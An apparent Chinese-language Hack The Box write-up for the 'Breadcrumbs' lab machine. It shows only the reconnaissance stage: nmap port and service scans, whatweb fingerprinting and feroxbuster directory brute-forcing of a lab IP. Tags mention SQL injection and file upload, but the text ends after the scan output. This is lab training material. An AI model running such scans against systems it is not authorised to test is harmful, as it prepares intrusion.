---
title: HTB-Breadcrumbs Writeup
date: 2026-10-12T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - Windows
  - JWT
  - 文件包含
  - 文件上传
  - 代码执行
  - SQL注入
  - MYSQL
---
## Nmap 探索

使用 nmap 探测存活的端口，并提取出来做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ sudo nmap --min-rate 10000 -p- 10.129.52.150 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-09 02:00 -0400
Nmap scan report for 10.129.52.150
Host is up (0.13s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 11.44 seconds
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669en
```

对存活的端口进行详细信息扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ sudo nmap -sT -sC -sV -O -p 22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669 10.129.52.150 -oA Nmap/detail
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-09 02:01 -0400
Nmap scan report for 10.129.52.150
Host is up (0.12s latency).

PORT      STATE  SERVICE       VERSION
22/tcp    open   ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp    open   http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
|_http-title: Library
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open   ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_ssl-date: TLS randomness does not represent time
|_http-title: Library
445/tcp   open   microsoft-ds?
3306/tcp  open   mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open   unknown
7680/tcp  closed pando-pub
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=10/9%OT=22%CT=7680%CU=33123%PV=Y%DS=2%DC=I%G=Y%TM=6AC8
OS:83F3%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%
OS:TS=U)SEQ(SP=102%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=105%GCD=1%
OS:ISR=105%TI=I%CI=RD%II=I%SS=S%TS=U)SEQ(SP=106%GCD=1%ISR=10E%TI=I%CI=RD%II
OS:=I%SS=S%TS=U)SEQ(SP=109%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M5
OS:42NW8NNS%O2=M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS
OS:)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W
OS:=FFFF%O=M542NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR
OS:%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80
OS:%W=FFFF%S=O%A=S+%F=AS%O=M542NW8NNS%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%C
OS:D=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-10-09T06:03:12
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_clock-skew: -1m08s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.32 seconds
```

开放了 22、80、443、445、3306 等端口。

## Web 侦察

使用 whatweb 没有新的发现。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ whatweb http://10.129.52.150
http://10.129.52.150 [200 OK] Apache[2.4.46], Bootstrap[4.0.0], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1], IP[10.129.52.150], JQuery[3.2.1], OpenSSL[1.1.1h], PHP[8.0.1], Script[text/javascript], Title[Library], X-Powered-By[PHP/8.0.1], X-UA-Compatible[IE=edge]
```

浏览 Web 界面，发现 80 端口和 443 端口的内容一致。发现一个书籍搜索系统。

![](Pasted%20image%2020261009141902.png)

使用 feroxbuster 进行目录爆破。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ feroxbuster -u http://10.129.52.150/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.52.150/
 🚩  In-Scope Url          │ 10.129.52.150
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       30w      302c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       33w      299c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       30w      341c http://10.129.52.150/includes => http://10.129.52.150/includes/
301      GET        9l       30w      335c http://10.129.52.150/js => http://10.129.52.150/js/
301      GET        9l       30w      336c http://10.129.52.150/css => http://10.129.52.150/css/
200      GET        0l        0w        0c http://10.129.52.150/js/main.js
200      GET       66l       80w      853c http://10.129.52.150/css/main.css
200      GET       89l      221w     4727c http://10.129.52.150/php/books.php
200      GET        5l       13w      196c http://10.129.52.150/includes/footer.php
200      GET        0l        0w        0c http://10.129.52.150/includes/bookController.php
301      GET        9l       30w      335c http://10.129.52.150/db => http://10.129.52.150/db/
200      GET       68l      146w     1937c http://10.129.52.150/js/books.js
301      GET        9l       30w      336c http://10.129.52.150/php => http://10.129.52.150/php/
200      GET     4586l     7794w    73117c http://10.129.52.150/css/all.css
200      GET       45l      118w     2368c http://10.129.52.150/
200      GET        0l        0w        0c http://10.129.52.150/db/db.php
301      GET        9l       30w      339c http://10.129.52.150/portal => http://10.129.52.150/portal/
301      GET        9l       30w      336c http://10.129.52.150/CSS => http://10.129.52.150/CSS/
200      GET       66l       80w      853c http://10.129.52.150/CSS/main.css
301      GET        9l       30w      338c http://10.129.52.150/books => http://10.129.52.150/books/
301      GET        9l       30w      348c http://10.129.52.150/portal/includes => http://10.129.52.150/portal/includes/
301      GET        9l       30w      341c http://10.129.52.150/Includes => http://10.129.52.150/Includes/
200      GET     4586l     7794w    73117c http://10.129.52.150/CSS/all.css
301      GET        9l       30w      347c http://10.129.52.150/portal/uploads => http://10.129.52.150/portal/uploads/
301      GET        9l       30w      346c http://10.129.52.150/portal/assets => http://10.129.52.150/portal/assets/
200      GET        5l       13w      196c http://10.129.52.150/portal/includes/footer.php
200      GET        4l       63w      435c http://10.129.52.150/books/book11.html
200      GET        4l       64w      465c http://10.129.52.150/books/book14.html
200      GET        4l       67w      468c http://10.129.52.150/books/book12.html
200      GET        0l        0w        0c http://10.129.52.150/portal/includes/issuesController.php
200      GET        0l        0w        0c http://10.129.52.150/portal/includes/usersController.php
200      GET        4l       62w      431c http://10.129.52.150/books/book8.html
200      GET        4l       61w      379c http://10.129.52.150/books/book3.html
200      GET        4l       58w      446c http://10.129.52.150/books/book10.html
200      GET        4l       62w      400c http://10.129.52.150/books/book7.html
200      GET        4l       49w      375c http://10.129.52.150/books/book9.html
301      GET        9l       30w      342c http://10.129.52.150/portal/db => http://10.129.52.150/portal/db/
301      GET        9l       30w      343c http://10.129.52.150/portal/php => http://10.129.52.150/portal/php/
200      GET        0l        0w        0c http://10.129.52.150/portal/includes/fileController.php
200      GET        5l       13w      196c http://10.129.52.150/Includes/footer.php
200      GET        0l        0w        0c http://10.129.52.150/Includes/bookController.php
200      GET        0l        0w        0c http://10.129.52.150/portal/db/db.php
301      GET        9l       30w      335c http://10.129.52.150/JS => http://10.129.52.150/JS/
200      GET        0l        0w        0c http://10.129.52.150/portal/assets/js/main.js
200      GET       12l       23w      192c http://10.129.52.150/portal/assets/css/style.css
200      GET     4586l     7794w    73117c http://10.129.52.150/portal/assets/css/all.css
200      GET       66l       80w      853c http://10.129.52.150/portal/assets/css/main.css
200      GET       23l       38w      585c http://10.129.52.150/portal/assets/js/files.js
200      GET        0l        0w        0c http://10.129.52.150/JS/main.js
200      GET      336l     1782w   145509c http://10.129.52.150/portal/assets/webfonts/fa-solid-900.woff2
200      GET      349l     2161w   189029c http://10.129.52.150/portal/assets/webfonts/fa-solid-900.woff
200      GET      273l     1751w   140313c http://10.129.52.150/portal/assets/webfonts/fa-brands-400.woff2
200      GET     2919l    15134w   235536c http://10.129.52.150/portal/assets/webfonts/fa-solid-900.ttf
200      GET     1839l     7533w   149215c http://10.129.52.150/portal/assets/webfonts/fa-brands-400.ttf
301      GET        9l       30w      336c http://10.129.52.150/Css => http://10.129.52.150/Css/
301      GET        9l       30w      335c http://10.129.52.150/Js => http://10.129.52.150/Js/
200      GET     5015l   105316w   914125c http://10.129.52.150/portal/assets/webfonts/fa-solid-900.svg
200      GET       68l      146w     1937c http://10.129.52.150/Js/books.js
200      GET       66l       80w      853c http://10.129.52.150/Css/main.css
301      GET        9l       30w      348c http://10.129.52.150/portal/Includes => http://10.129.52.150/portal/Includes/
200      GET        0l        0w        0c http://10.129.52.150/Js/main.js
200      GET     4586l     7794w    73117c http://10.129.52.150/Css/all.css
200      GET        5l       13w      196c http://10.129.52.150/portal/Includes/footer.php
200      GET        0l        0w        0c http://10.129.52.150/portal/Includes/issuesController.php
200      GET        0l        0w        0c http://10.129.52.150/portal/Includes/fileController.php
200      GET        0l        0w        0c http://10.129.52.150/portal/Includes/usersController.php
503      GET       11l       44w      402c http://10.129.52.150/examples
301      GET        9l       30w      347c http://10.129.52.150/portal/Uploads => http://10.129.52.150/portal/Uploads/
301      GET        9l       30w      346c http://10.129.52.150/portal/Assets => http://10.129.52.150/portal/Assets/
200      GET       66l       80w      853c http://10.129.52.150/portal/Assets/css/main.css
200      GET       12l       23w      192c http://10.129.52.150/portal/Assets/css/style.css
200      GET        0l        0w        0c http://10.129.52.150/portal/Assets/js/main.js
200      GET       23l       38w      585c http://10.129.52.150/portal/Assets/js/files.js
200      GET       70l      366w    30184c http://10.129.52.150/portal/Assets/webfonts/fa-regular-400.woff
200      GET     4586l     7794w    73117c http://10.129.52.150/portal/Assets/css/all.css
200      GET      379l     1897w    40385c http://10.129.52.150/portal/Assets/webfonts/fa-regular-400.eot
301      GET        9l       30w      335c http://10.129.52.150/DB => http://10.129.52.150/DB/
200      GET        0l        0w        0c http://10.129.52.150/DB/db.php
200      GET     2919l    15134w   235536c http://10.129.52.150/portal/Assets/webfonts/fa-solid-900.ttf
200      GET      805l    17194w   144715c http://10.129.52.150/portal/Assets/webfonts/fa-regular-400.svg
200      GET     2920l    15147w   235832c http://10.129.52.150/portal/Assets/webfonts/fa-solid-900.eot
200      GET     5015l   105316w   914125c http://10.129.52.150/portal/Assets/webfonts/fa-solid-900.svg
200      GET     1839l     7547w   149529c http://10.129.52.150/portal/Assets/webfonts/fa-brands-400.eot
301      GET        9l       30w      336c http://10.129.52.150/PHP => http://10.129.52.150/PHP/
200      GET       89l      221w     4727c http://10.129.52.150/PHP/books.php
301      GET        9l       30w      339c http://10.129.52.150/Portal => http://10.129.52.150/Portal/
301      GET        9l       30w      346c http://10.129.52.150/portal/vendor => http://10.129.52.150/portal/vendor/
301      GET        9l       30w      342c http://10.129.52.150/portal/DB => http://10.129.52.150/portal/DB/
200      GET        0l        0w        0c http://10.129.52.150/portal/vendor/autoload.php
200      GET        0l        0w        0c http://10.129.52.150/portal/DB/db.php
200      GET        0l        0w        0c http://10.129.52.150/portal/vendor/composer/autoload_real.php
200      GET        0l        0w        0c http://10.129.52.150/portal/vendor/composer/autoload_static.php
301      GET        9l       30w      348c http://10.129.52.150/Portal/includes => http://10.129.52.150/Portal/includes/
200      GET        0l        0w        0c http://10.129.52.150/portal/vendor/composer/autoload_namespaces.php
200      GET        0l        0w        0c http://10.129.52.150/portal/vendor/composer/platform_check.php
200      GET       21l      168w     1070c http://10.129.52.150/portal/vendor/composer/LICENSE
200      GET        0l        0w        0c http://10.129.52.150/portal/vendor/composer/installed.php
200      GET      164l      307w     6074c http://10.129.52.150/portal/vendor/composer/installed.json
200      GET        0l        0w        0c http://10.129.52.150/portal/vendor/composer/ClassLoader.php
200      GET        0l        0w        0c http://10.129.52.150/portal/vendor/composer/InstalledVersions.php
200      GET        0l        0w        0c http://10.129.52.150/portal/vendor/composer/autoload_psr4.php
200      GET        0l        0w        0c http://10.129.52.150/portal/vendor/composer/autoload_classmap.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/includes/usersController.php
200      GET        5l       13w      196c http://10.129.52.150/Portal/includes/footer.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/includes/fileController.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/includes/issuesController.php
301      GET        9l       30w      346c http://10.129.52.150/Portal/assets => http://10.129.52.150/Portal/assets/
301      GET        9l       30w      342c http://10.129.52.150/Portal/db => http://10.129.52.150/Portal/db/
301      GET        9l       30w      343c http://10.129.52.150/Portal/php => http://10.129.52.150/Portal/php/
200      GET        0l        0w        0c http://10.129.52.150/Portal/db/db.php
200      GET       82l      189w     4395c http://10.129.52.150/Portal/php/admins.php
200      GET       23l       38w      585c http://10.129.52.150/Portal/assets/js/files.js
200      GET        0l        0w        0c http://10.129.52.150/Portal/assets/js/main.js
200      GET       12l       23w      192c http://10.129.52.150/Portal/assets/css/style.css
301      GET        9l       30w      343c http://10.129.52.150/portal/PHP => http://10.129.52.150/portal/PHP/
302      GET        0l        0w        0c http://10.129.52.150/portal/PHP/users.php => ../auth/login.php
200      GET      379l     1897w    40385c http://10.129.52.150/Portal/assets/webfonts/fa-regular-400.eot
200      GET       53l      299w    24708c http://10.129.52.150/Portal/assets/webfonts/fa-regular-400.woff2
301      GET        9l       30w      348c http://10.129.52.150/Portal/Includes => http://10.129.52.150/Portal/Includes/
200      GET      376l     2014w   164046c http://10.129.52.150/Portal/assets/webfonts/fa-brands-400.woff
200      GET        5l       13w      196c http://10.129.52.150/Portal/Includes/footer.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/Includes/issuesController.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/Includes/usersController.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/Includes/fileController.php
301      GET        9l       30w      347c http://10.129.52.150/Portal/Uploads => http://10.129.52.150/Portal/Uploads/
301      GET        9l       30w      346c http://10.129.52.150/Portal/Assets => http://10.129.52.150/Portal/Assets/
200      GET      349l     2161w   189029c http://10.129.52.150/Portal/assets/webfonts/fa-solid-900.woff
200      GET        0l        0w        0c http://10.129.52.150/Portal/Assets/js/main.js
200      GET       23l       38w      585c http://10.129.52.150/Portal/Assets/js/files.js
200      GET       12l       23w      192c http://10.129.52.150/Portal/Assets/css/style.css
200      GET      805l    17194w   144715c http://10.129.52.150/Portal/assets/webfonts/fa-regular-400.svg
200      GET     2919l    15134w   235536c http://10.129.52.150/Portal/assets/webfonts/fa-solid-900.ttf
200      GET     1839l     7533w   149215c http://10.129.52.150/Portal/assets/webfonts/fa-brands-400.ttf
301      GET        9l       30w      346c http://10.129.52.150/Portal/vendor => http://10.129.52.150/Portal/vendor/
301      GET        9l       30w      342c http://10.129.52.150/Portal/DB => http://10.129.52.150/Portal/DB/
200      GET        0l        0w        0c http://10.129.52.150/Portal/vendor/autoload.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/DB/db.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/vendor/composer/installed.php
403      GET       11l       47w      421c http://10.129.52.150/licenses
403      GET       11l       47w      421c http://10.129.52.150/server-status
301      GET        9l       30w      343c http://10.129.52.150/Portal/PHP => http://10.129.52.150/Portal/PHP/
302      GET        0l        0w        0c http://10.129.52.150/Portal/PHP/issues.php => ../auth/login.php
302      GET        0l        0w        0c http://10.129.52.150/Portal/PHP/users.php => ../auth/login.php
302      GET        2l       13w      148c http://10.129.52.150/Portal/PHP/files.php => ../auth/login.php
301      GET        9l       30w      338c http://10.129.52.150/Books => http://10.129.52.150/Books/
200      GET        4l       49w      375c http://10.129.52.150/Books/book9.html
200      GET        4l       62w      400c http://10.129.52.150/Books/book7.html
200      GET        4l       63w      435c http://10.129.52.150/Books/book11.html
200      GET        4l       58w      446c http://10.129.52.150/Books/book10.html
200      GET        4l       64w      465c http://10.129.52.150/Books/book14.html
200      GET        4l       67w      468c http://10.129.52.150/Books/book12.html
200      GET        4l       62w      431c http://10.129.52.150/Books/book8.html
200      GET       82l      189w     4395c http://10.129.52.150/Portal/PHP/admins.php
200      GET        4l       61w      379c http://10.129.52.150/Books/book3.html
200      GET        0l        0w        0c http://10.129.52.150/Portal/vendor/composer/autoload_real.php
200      GET       21l      168w     1070c http://10.129.52.150/Portal/vendor/composer/LICENSE
200      GET        0l        0w        0c http://10.129.52.150/Portal/vendor/composer/autoload_namespaces.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/vendor/composer/autoload_psr4.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/vendor/composer/ClassLoader.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/vendor/composer/autoload_classmap.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/vendor/composer/InstalledVersions.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/vendor/composer/autoload_static.php
200      GET      164l      307w     6074c http://10.129.52.150/Portal/vendor/composer/installed.json
200      GET        0l        0w        0c http://10.129.52.150/Portal/vendor/composer/platform_check.php
200      GET      379l     1885w    40081c http://10.129.52.150/Portal/Assets/webfonts/fa-regular-400.ttf
200      GET      376l     2014w   164046c http://10.129.52.150/Portal/Assets/webfonts/fa-brands-400.woff
200      GET       53l      299w    24708c http://10.129.52.150/Portal/Assets/webfonts/fa-regular-400.woff2
200      GET      379l     1897w    40385c http://10.129.52.150/Portal/Assets/webfonts/fa-regular-400.eot
301      GET        9l       30w      347c http://10.129.52.150/Portal/uploads => http://10.129.52.150/Portal/uploads/
200      GET       70l      366w    30184c http://10.129.52.150/Portal/Assets/webfonts/fa-regular-400.woff
302      GET        2l       13w      148c http://10.129.52.150/portal/PHP/files.php => ../auth/login.php
302      GET        0l        0w        0c http://10.129.52.150/portal/PHP/issues.php => ../auth/login.php
200      GET      336l     1782w   145509c http://10.129.52.150/Portal/Assets/webfonts/fa-solid-900.woff2
200      GET     4586l     7794w    73117c http://10.129.52.150/Portal/Assets/css/all.css
200      GET       82l      189w     4395c http://10.129.52.150/portal/PHP/admins.php
200      GET      273l     1751w   140313c http://10.129.52.150/Portal/Assets/webfonts/fa-brands-400.woff2
200      GET     2919l    15134w   235536c http://10.129.52.150/Portal/Assets/webfonts/fa-solid-900.ttf
200      GET       66l       80w      853c http://10.129.52.150/Portal/Assets/css/main.css
200      GET      379l     1885w    40081c http://10.129.52.150/Portal/assets/webfonts/fa-regular-400.ttf
200      GET      273l     1751w   140313c http://10.129.52.150/Portal/assets/webfonts/fa-brands-400.woff2
200      GET      796l     3518w   204266c http://10.129.52.150/Portal/assets/webfonts/fa-solid-900.eot
200      GET       53l      282w    23776c http://10.129.52.150/Portal/assets/webfonts/fa-regular-400.woff
200      GET       86l     1411w   914125c http://10.129.52.150/Portal/assets/webfonts/fa-solid-900.svg
200      GET       62l      295w    80148c http://10.129.52.150/Portal/assets/webfonts/fa-solid-900.woff2
200      GET      509l     2133w   134622c http://10.129.52.150/Portal/assets/webfonts/fa-brands-400.eot
200      GET      225l     4116w   730302c http://10.129.52.150/Portal/assets/webfonts/fa-brands-400.svg
200      GET     2920l    15147w   235832c http://10.129.52.150/Portal/Assets/webfonts/fa-solid-900.eot
200      GET     3637l    76781w   730302c http://10.129.52.150/Portal/Assets/webfonts/fa-brands-400.svg
301      GET        9l       30w      341c http://10.129.52.150/INCLUDES => http://10.129.52.150/INCLUDES/
200      GET        0l        0w        0c http://10.129.52.150/INCLUDES/bookController.php
200      GET        5l       13w      196c http://10.129.52.150/INCLUDES/footer.php
200      GET     5015l   105316w   914125c http://10.129.52.150/Portal/Assets/webfonts/fa-solid-900.svg
301      GET        9l       30w      348c http://10.129.52.150/portal/INCLUDES => http://10.129.52.150/portal/INCLUDES/
200      GET        5l       13w      196c http://10.129.52.150/portal/INCLUDES/footer.php
200      GET        0l        0w        0c http://10.129.52.150/portal/INCLUDES/fileController.php
200      GET        0l        0w        0c http://10.129.52.150/portal/INCLUDES/usersController.php
200      GET        0l        0w        0c http://10.129.52.150/portal/INCLUDES/issuesController.php
200      GET        5l       13w      196c http://10.129.52.150/Portal/INCLUDES/footer.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/INCLUDES/usersController.php
301      GET        9l       30w      348c http://10.129.52.150/Portal/INCLUDES => http://10.129.52.150/Portal/INCLUDES/
[#######>------------] - 45s    32415/90331   83s     found:198     errors:84
[#######>------------] - 45s    11678/30000   262/s   http://10.129.52.150/
[####################] - 0s     30000/30000   113208/s http://10.129.52.150/includes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   110701/s http://10.129.52.150/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   58594/s http://10.129.52.150/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   250000/s http://10.129.52.150/php/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   127660/s http://10.129.52.150/db/ => Directory listing (add --scan-dir-listings to scan)
[#######>------------] - 43s    11053/30000   257/s   http://10.129.52.150/portal/
[####################] - 1s     30000/30000   59880/s http://10.129.52.150/CSS/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   78125/s http://10.129.52.150/portal/includes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   96463/s http://10.129.52.150/books/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   116279/s http://10.129.52.150/portal/uploads/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   102389/s http://10.129.52.150/portal/assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   113208/s http://10.129.52.150/Includes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4205/s  http://10.129.52.150/portal/db/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4210/s  http://10.129.52.150/portal/php/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4206/s  http://10.129.52.150/portal/assets/webfonts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   102740/s http://10.129.52.150/portal/assets/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4207/s  http://10.129.52.150/portal/assets/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4209/s  http://10.129.52.150/JS/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   80429/s http://10.129.52.150/Css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   83565/s http://10.129.52.150/Js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   125523/s http://10.129.52.150/portal/Includes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   115830/s http://10.129.52.150/portal/Uploads/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   115385/s http://10.129.52.150/portal/Assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   77519/s http://10.129.52.150/portal/Assets/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4209/s  http://10.129.52.150/portal/Assets/webfonts/ => Directory listing (add --scan-dir-listings to scan)
301      GET        9l       30w      347c http://10.129.52.150/portal/UPLOADS => http://10.129.52.150/portal/UPLOADS/
301      GET        9l       30w      336c http://10.129.52.150/Php => http://10.129.52.150/Php/
200      GET       89l      221w     4727c http://10.129.52.150/Php/books.php
200      GET       82l      189w     4395c http://10.129.52.150/portal/Php/admins.php
302      GET        0l        0w        0c http://10.129.52.150/portal/Php/issues.php => ../auth/login.php
302      GET        2l       13w      148c http://10.129.52.150/portal/Php/files.php => ../auth/login.php
301      GET        9l       30w      346c http://10.129.52.150/portal/Vendor => http://10.129.52.150/portal/Vendor/
302      GET        0l        0w        0c http://10.129.52.150/portal/Php/users.php => ../auth/login.php
200      GET        0l        0w        0c http://10.129.52.150/portal/Vendor/autoload.php
301      GET        9l       30w      343c http://10.129.52.150/portal/Php => http://10.129.52.150/portal/Php/
200      GET        0l        0w        0c http://10.129.52.150/portal/Vendor/composer/installed.php
200      GET        0l        0w        0c http://10.129.52.150/portal/Vendor/composer/autoload_namespaces.php
200      GET        0l        0w        0c http://10.129.52.150/portal/Vendor/composer/autoload_real.php
200      GET        0l        0w        0c http://10.129.52.150/portal/Vendor/composer/ClassLoader.php
200      GET        0l        0w        0c http://10.129.52.150/portal/Vendor/composer/platform_check.php
200      GET       21l      168w     1070c http://10.129.52.150/portal/Vendor/composer/LICENSE
200      GET        0l        0w        0c http://10.129.52.150/portal/Vendor/composer/autoload_psr4.php
200      GET        0l        0w        0c http://10.129.52.150/portal/Vendor/composer/InstalledVersions.php
200      GET      164l      307w     6074c http://10.129.52.150/portal/Vendor/composer/installed.json
200      GET        0l        0w        0c http://10.129.52.150/portal/Vendor/composer/autoload_classmap.php
200      GET        0l        0w        0c http://10.129.52.150/portal/Vendor/composer/autoload_static.php
301      GET        9l       30w      347c http://10.129.52.150/Portal/UPLOADS => http://10.129.52.150/Portal/UPLOADS/
302      GET        2l       13w      148c http://10.129.52.150/Portal/Php/files.php => ../auth/login.php
200      GET       82l      189w     4395c http://10.129.52.150/Portal/Php/admins.php
301      GET        9l       30w      346c http://10.129.52.150/Portal/Vendor => http://10.129.52.150/Portal/Vendor/
200      GET        0l        0w        0c http://10.129.52.150/Portal/Vendor/autoload.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/Vendor/composer/autoload_namespaces.php
200      GET       21l      168w     1070c http://10.129.52.150/Portal/Vendor/composer/LICENSE
200      GET      164l      307w     6074c http://10.129.52.150/Portal/Vendor/composer/installed.json
200      GET        0l        0w        0c http://10.129.52.150/Portal/Vendor/composer/installed.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/Vendor/composer/platform_check.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/Vendor/composer/autoload_static.php
200      GET        0l        0w        0c http://10.129.52.150/Portal/Vendor/composer/ClassLoader.php
301      GET        9l       30w      339c http://10.129.52.150/PORTAL => http://10.129.52.150/PORTAL/
200      GET        0l        0w        0c http://10.129.52.150/Portal/Vendor/composer/autoload_real.php
